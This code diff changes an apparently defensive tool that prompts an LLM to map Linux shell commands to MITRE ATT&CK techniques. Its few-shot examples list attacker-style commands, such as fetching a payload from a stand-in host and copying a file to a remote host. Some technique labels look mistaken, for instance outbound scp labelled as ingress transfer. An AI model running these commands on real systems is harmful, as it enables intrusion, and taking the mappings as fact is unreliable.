@@ -10,7 +10,7 @@ from src.proteus.telemetry.models import InteractionInfo, MitreMapping, MitreMap
 
 MAX_INTERACTION_CONTEXT = 5
 
-MITRE_FEW_SHOT_EXAMPLES = [
+MITRE_EXAMPLES = [
   (
     ["ps -aux"],
     "T1057",
@@ -18,16 +18,10 @@ MITRE_FEW_SHOT_EXAMPLES = [
     "The command 'ps -aux' is used to list all running processes on a system. This maps to process discovery with high confidence.",
   ),
   (
-    ["ls"],
-    "T1083",
-    0.19,
-    "The command 'ls' alone is ambiguous, so the confidence is low without surrounding context.",
-  ),
-  (
-    ["cd /etc", "ls"],
-    "T1083",
-    0.42,
-    "The command 'ls' by itself is ambiguous, but the directory in wich it is being executed contains sensitive information.",
+    ["kldstat | grep -i \"vmm\""],
+    "T1082",
+    0.93,
+    "The command 'kdstat' is used to display kernel statistics. This maps to system information discovery with high confidence.",
   ),
   (
     ["whoami", "users", "id"],
@@ -42,34 +36,46 @@ MITRE_FEW_SHOT_EXAMPLES = [
     "The earlier navigation into /var/log makes the later ls and cat auth.log commands part of a file and directory discovery sequence influenced by prior context.",
   ),
   (
-    ["netstat", "ifconfig"],
-    "T1016",
-    0.96,
-    "The command history shows active network discovery followed by local interface enumeration. The grouped context supports network discovery with high confidence.",
-  ),
-  (
-    ["pwd"],
-    "T1083",
-    0.11,
-    "The command 'pwd' by itself does not provide enough context for a definitive mapping.",
+    ["sockstat", "netstat", "who -a"],
+    "T1049",
+    0.97,
+    "The commands 'sockstat', 'netstat', and 'who -a' are used to display active network connections and user information. This maps to System Network Connections Discovery with high confidence.",
   ),
   (
     ["cat /etc/passwd"],
     "T1003",
     0.99,
-    "The command 'cat /etc/passwd' is used to read the contents of the /etc/passwd file. This maps to credential access with very high confidence.",
+    "The command 'cat' is used to read the contents of the /etc/passwd file. This maps to credential access with very high confidence.",
   ),
   (
-    ["wget maliciouscontent.com/payload"],
+    ["cat /sys/class/dmi/id/anyfile"],
+    "T1082",
+    0.92,
+    "The command 'cat' is used to dump the contents of a file in the directory /sys/class, wich contains information about the system. This maps to system information discovery with very high confidence.",
+  ),
+  (
+    ["scp maliciousfile.txt user@remotehost:/tmp"],
     "T1105",
-    0.81,
-    "The command 'wget maliciouscontent.com/payload' is used to download a file from a remote server. This maps to ingress tool transfer with high confidence.",
+    0.84,
+    "The command 'scp' is used to securely copy a file to a remote host. This maps to ingress tool transfer with high confidence.",
   ),
   (
-    ["whoami"],
-    "T1033",
-    0.85,
-    "The command 'whoami' is used to display the current user's username. This maps to system information discovery with high confidence.",
+    ["findmnt -t nfs"],
+    "T1083",
+    0.77,
+    "The command 'findmnt' is used to display information about mounted filesystems. This maps to file and directory discovery with moderate confidence.",
+  ),
+  (
+    ["sudo -l", "sudo command"],
+    "T1548",
+    0.69,
+    "The command 'sudo' is used to execute a command with elevated privileges. This maps to abuse elevation control mechanism with moderate confidence.",
+  ),
+  (
+    ["chmod 777 /dir/examplefile"],
+    "T1222",
+    0.95,
+    "The command 'chmod' is used to change the permissions of a file. This maps to file and directory permissions modification with high confidence.",
   ),
   (
     ["unknowncommand -arg"],
@@ -79,7 +85,7 @@ MITRE_FEW_SHOT_EXAMPLES = [
   ),
   (
     ["gdsgya"],
-    "T1059",
+    "T1098",
     0.06,
     "The command 'gdsgya' is probably a typo or unknown command. The mapping is uncertain.",
   ),
@@ -105,7 +111,7 @@ class MitreMapper:
 
   def _build_example_text(self, limit: int | None = None) -> str:
     example_blocks: list[str] = []
-    examples_to_use = MITRE_FEW_SHOT_EXAMPLES if limit is None else MITRE_FEW_SHOT_EXAMPLES[:limit]
+    examples_to_use = MITRE_EXAMPLES if limit is None else MITRE_EXAMPLES[:limit]
     for commands, technique_id, confidence, cti_sentence in examples_to_use:
       target_cmd = commands[-1]
       history_cmds = commands[:-1]
@@ -127,21 +133,36 @@ class MitreMapper:
   def _build_mapping_prompt(self, current_command: str, interactions: list[InteractionInfo]) -> tuple[str, str]:
     history_text = self._format_interactions(interactions)
 
-    example_text = self._build_example_text()
+    is_tiny_model = "tinyllama" in self.llm_model.lower()
 
-    system_prompt = (
-      "You are an expert Cyber Threat Intelligence analyst mapping Linux shell commands to MITRE ATT&CK techniques. "
-      "Return only valid JSON and do not wrap it in markdown. "
-      "Your core task is to evaluate the 'Target Command' ONLY, using the 'Interaction History' solely as context to resolve ambiguities."
-    )
-    user_prompt = (
-      f"Examples:\n{example_text}\n\n"
-      f"Interaction History (Context):\n{history_text if history_text else 'No prior history.'}\n\n"
-      f"Target Command to Evaluate: '{current_command}'\n\n"
-      "Task: Identify the most likely MITRE ATT&CK technique for the 'Target Command' above. "
-      "Return a single JSON object with these exact fields:\n"
-      '{"technique_id": "T####", "confidence": 0.0, "cti_sentence": "<sentence detailing the reasoning for THIS specific target command>"}'
-    )
+    if is_tiny_model:
+      system_prompt = "You are a Linux command classifier. Output ONLY valid JSON."
+      user_prompt = (
+        f"History: {history_text if history_text else 'None'}\n"
+        f"Target Command: '{current_command}'\n\n"
+        "Classify the Target Command. Respond ONLY with a JSON object containing:\n"
+        "- technique_id (string, e.g., 'T1082')\n"
+        "- confidence (float between 0.0 and 1.0)\n"
+        "- cti_sentence (string, brief explanation)\n\n"
+        "JSON:"
+      )
+
+    else:
+      example_text = self._build_example_text()
+
+      system_prompt = (
+        "You are an expert Cyber Threat Intelligence analyst mapping Linux shell commands to MITRE ATT&CK techniques. "
+        "Return only valid JSON and do not wrap it in markdown. "
+        "Your core task is to evaluate the 'Target Command' ONLY, using the 'Interaction History' solely as context to resolve ambiguities."
+      )
+      user_prompt = (
+        f"Examples:\n{example_text}\n\n"
+        f"Interaction History (Context):\n{history_text if history_text else 'No prior history.'}\n\n"
+        f"Target Command to Evaluate: '{current_command}'\n\n"
+        "Task: Identify the most likely MITRE ATT&CK technique for the 'Target Command' above. "
+        "Return a single JSON object with these exact fields:\n"
+        '{"technique_id": "T####", "confidence": 0.0, "cti_sentence": "<sentence detailing the reasoning for THIS specific target command>"}'
+      )
 
     return system_prompt, user_prompt
 
@@ -199,9 +220,7 @@ class MitreMapper:
 
     if not technique_id or not cti_sentence:
       return None
-    
-    logger.info(f"Attack techniques available: {self.attack_data_keys}")
-    
+        
     if technique_id not in self.attack_data_keys:
       return MitreMappingError(
         error_type="TechniqueNotFound",
@@ -254,7 +273,7 @@ class MitreMapper:
       payload = self._parse_prediction_payload(raw_output)
       payload = self._coerce_payload(payload)
       if not isinstance(payload, dict):
-        logger.error(f"Invalid MITRE mapping payload returned by the LLM: {raw_output}")
+        # logger.error(f"Invalid MITRE mapping payload returned by the LLM: {raw_output}")
         return MitreMappingError(
           error_type="InvalidPayload",
           error_message=f"Invalid MITRE mapping payload returned by the LLM: {raw_output}",
